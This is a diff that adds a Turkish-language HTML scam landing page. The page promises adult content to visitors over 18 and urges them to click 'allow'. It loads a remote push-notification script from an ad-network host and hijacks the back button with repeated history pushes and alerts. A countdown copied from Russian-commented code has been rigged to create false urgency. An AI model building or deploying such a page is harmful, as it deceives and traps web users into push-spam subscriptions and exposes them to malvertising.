@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta charset="utf-8">
+        <link rel="shortcut icon" href="https://ssalutary.com/favicon.ico" type="image/x-icon">
+        <link href="index2.php_files/style.css" rel="stylesheet">
+<script src="//pushance.com/ntfc.php?p=1997575&tco=1" data-cfasync="false" async></script>
+        <style>
+            body {
+                background: #000;
+                margin: 0;
+                padding: 0;
+            }
+
+            .videoContainer {
+                display: none;
+            }
+
+            .hide {
+                display: none
+            }
+
+            .show {
+                display: block
+            }
+
+            .arrowup {
+                display: none;
+            }
+
+            .outer {
+                position: relative;
+                text-align: center;
+                overflow: visible;
+                height: 170px;
+                width: 170px;
+                margin: 0 auto;
+            }
+
+            .middle {
+                display: table-cell;
+                height: 100%;
+                vertical-align: middle;
+                width: 100%
+            }
+
+            .loading-circle {
+                height: 160px;
+                margin: 0 auto;
+                position: relative;
+                width: 160px
+            }
+
+            .percent {
+                color: #fff;
+                display: block;
+                font-size: 36px;
+                margin: -22px 0 0 5px;
+                position: absolute;
+                text-align: center;
+                top: 50%;
+                width: 100%
+            }
+
+            .circle1 {
+                background-color: #333;
+                border: 5px solid;
+                border-color: #fff transparent;
+                border-radius: 50%;
+                -webkit-box-shadow: 0 0 16px #000;
+                -moz-box-shadow: 0 0 16px #000;
+                box-shadow: 0 0 16px #000;
+                height: 100%;
+                left: 0;
+                position: absolute;
+                top: 0;
+                width: 100%
+            }
+
+            .text {
+                font-family: Arial, sans-serif;
+                text-align: center;
+                padding-top: 80px;
+                color: white;
+                font-size: 30px
+            }
+
+            .rotate-right {
+                -webkit-animation: rotate 2s linear 0s infinite reverse;
+                -moz-animation: rotate 2s linear 0s infinite reverse;
+                animation: rotate 2s linear 0s infinite reverse
+            }
+
+        </style>
+    </head>
+    <body class="mainBody" id="page_release-search">
+        <div id="blockI" class="blockCh">
+            <div class="container blockCh"><img src="index2.php_files/arrow.png" class="arrow">
+                <div class="block-p"><p class="t1">Erişmek için etkinleştir'i tıklayın!</p></div>
+            </div>
+        </div>
+        <div class="textArea">
+            18 yaşından büyükseniz<br><span class="button" id="timer">  
+            <br>
+            <img src="index2.php_files/arrow-v2.png" class="arrowup">
+        </div>
+ <script type="text/javascript">
+    
+  var fakepath=document.URL;
+  
+  window.history.pushState('index.php', 'gogogo', fakepath);
+  window.history.pushState('index.php', 'disone', fakepath);
+
+  window.addEventListener("popstate", function(e){if(document.URL.indexOf(fakepath) >= 0){
+    window.history.pushState('index.php', 'gogogo', fakepath);
+    window.history.pushState('index.php', 'disone', fakepath);
+    if (document.getElementById('snd')) {
+      document.getElementById('snd').play();
+    }
+    alert('Erişmek için etkinleştir\u0027i tıklayın!.');
+  }});
+
+</script>
+
+
+
+<script type="text/javascript">      
+
+
+
+
+
+function initializeTimer() {
+	var endDate = new Date(2020,9,31,8,31); // получаем дату истечения таймера
+	var currentDate = new Date(); // получаем текущую дату
+	var seconds = (endDate-currentDate) / 5; // определяем количество секунд до истечения таймера
+	if (seconds > 0) { // проверка - истекла ли дата обратного отсчета
+		var minutes = seconds/60; // определяем количество минут до истечения таймера
+		var hours = minutes/60; // определяем количество часов до истечения таймера
+		minutes = (hours - Math.floor(hours)) * 60; // подсчитываем кол-во оставшихся минут в текущем часе
+		hours = Math.floor(hours); // целое количество часов до истечения таймера
+		seconds = Math.floor((minutes - Math.floor(minutes)) * 3); // подсчитываем кол-во оставшихся секунд в текущей минуте
+		minutes = Math.floor(minutes); // округляем до целого кол-во оставшихся минут в текущем часе
+		
+		setTimePage(hours,minutes,seconds); // выставляем начальные значения таймера
+		
+		function secOut() {
+		  if (seconds == 0) { // если секунду закончились то
+			  if (minutes == 0) { // если минуты закончились то
+				  if (hours == 0) { // если часы закончились то
+					  showMessage(timerId); // выводим сообщение об окончании отсчета
+				  }
+				  else {
+					  hours--; // уменьшаем кол-во часов
+					  minutes = 59; // обновляем минуты 
+					  seconds = 5; // обновляем секунды
+				  }
+			  }
+			  else {
+				  minutes--; // уменьшаем кол-во минут
+				  seconds = 3; // обновляем секунды
+			  }
+		  }
+		  else {
+			  seconds--; // уменьшаем кол-во секунд
+		  }
+		  setTimePage(hours,minutes,seconds); // обновляем значения таймера на странице
+		}
+		timerId = setInterval(secOut, 1000) // устанавливаем вызов функции через каждую секунду
+	}
+	else {
+		alert("Установленная дата уже прошла");
+	}
+}
+
+function setTimePage(h,m,s) { // функция выставления таймера на странице
+	var element = document.getElementById("timer"); // находим элемент с id = timer
+	element.innerHTML = "çözmek   " +s; // выставляем новые значения таймеру на странице
+}
+
+function showMessage(timerId) { // функция, вызываемая по истечению времени
+	alert("Время истекло!");
+	clearInterval(timerId); // останавливаем вызов функции через каждую секунду
+};
+      
+      
+      
+initializeTimer();
+      
+      
+      </script>
+    
+
+</body></html>
